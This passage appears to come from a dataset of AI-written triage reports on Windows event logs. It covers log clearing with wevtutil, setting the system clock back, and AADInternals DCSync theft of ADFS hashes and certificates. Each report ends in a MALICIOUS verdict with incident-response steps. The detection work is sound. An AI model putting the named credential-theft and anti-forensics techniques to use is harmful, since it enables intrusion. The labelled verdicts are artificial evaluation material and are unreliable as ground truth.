5. **Edge and EdgeUpdate Processes**:
   - The logs indicate frequent execution of Microsoft Edge Update processes, including service and setup executables. While these could be routine updates, their high frequency and timing concurrent with suspicious activities necessitate further scrutiny to ascertain if they have been leveraged for malicious purposes.

6. **Privilege Level**:
   - Many of the processes, including those involving clearing event logs, run with high integrity and system-level privileges. This suggests that the user `admin_test` has elevated permissions on the machine, increasing the risk associated with their actions.

Given the presence of command-line credential access, log clearing actions, and other suspicious command executions, the activity seen in these logs is highly indicative of malicious behavior.

**Assessment:** MALICIOUS

**Guidance**:
- **Immediate Actions**: Isolate the machine from the network to prevent further data exfiltration or lateral movement by any potential attacker. 
- **Credential Reset**: As credential access activities have been noted, initiate a mandatory password reset for all accounts associated with the affected user and related administrative accounts.
- **Forensic Analysis**: Perform a comprehensive analysis of the system to determine additional compromise indicators and evaluate the scope of potential data compromise.
- **Review Access Rights**: Reevaluate the access permissions of the user `admin_test` to ensure adherence to the principle of least privilege moving forward.
- **Logging and Monitoring**: Reinstate and enhance logging configurations to capture more detailed information in the future."
ADFS token signing and encryption certificates theft - Remote,"Upon analyzing the provided Windows event logs, several activities stand out as potentially suspicious:

1. **Event Log Clearing**: There is evidence of event log clearing activity as indicated by Security EventID 1102. This event suggests that an administrator or a process with high privileges has cleared the Security Log (`LogFileCleared`). The subject is identified as `admin_test`, a user on SERVER002. This log clearing can often be an indicator of malicious behavior attempting to cover tracks after unauthorized actions.

2. **Time Manipulation**: The event logs for System (EventID 4616) suggest that the system time was altered. The `PreviousTime` and `NewTime` entries indicate a backward adjustment of the system clock, which can be an indicator of malicious activity. Time manipulation is often used in attempts to align logs after manipulation or to avoid detection tools that rely on timestamp analysis.

3. **Suspicious PowerShell Activities**: Multiple logs show the execution of PowerShell with AADInternals, as seen in the Security and Sysmon logs. The PowerShell logs indicate usage of commands to extract Active Directory service account information and potentially compromise credentials using DCSync attacks. This includes retrieval of ADFS service account hashes and decryption of related certificates.

4. **Use of `wevtutil.exe` to Clear Logs**: Repeated execution of `wevtutil.exe` (Windows Eventing Command Line Utility) to clear logs from Powershell, System, Security, etc., indicates an effort to erase traces of any prior execution or actions taken - another strong indicator of malicious activities.

5. **Integrity Level and Privileges**: Several processes exhibit a ""High"" integrity level running under admin privileges; this includes suspicious command-line execution with powerful rights that can modify system states or configurations.

Based on these findings, the actions noted are aligned with typical malicious behaviors where an attacker attempts to hide their presence or manipulate system records. 

### Resolution: MALICIOUS

**Assessment & Guidance**:
- It's highly likely that there has been a compromise or attempted compromise on Server002.
- Immediate action should include isolating the affected host from the network to prevent further unauthorized access.
- Conduct a detailed forensic analysis of the system to identify further signs of compromise and assess the scope of potential breaches.
- Change all sensitive passwords, especially those related to Active Directory service accounts, since there may have been an attempt to steal authentication hashes.
- Enhance monitoring for the early detection of similar events across the network and review access privileges assigned to users.
- Due to the potential breach of credentials and sensitive data, initiate an incident response plan to handle communication, investigation, and remediation steps.

In summary, server integrity is in question, and further forensic investigation is necessary to confirm the full extent of the breach."
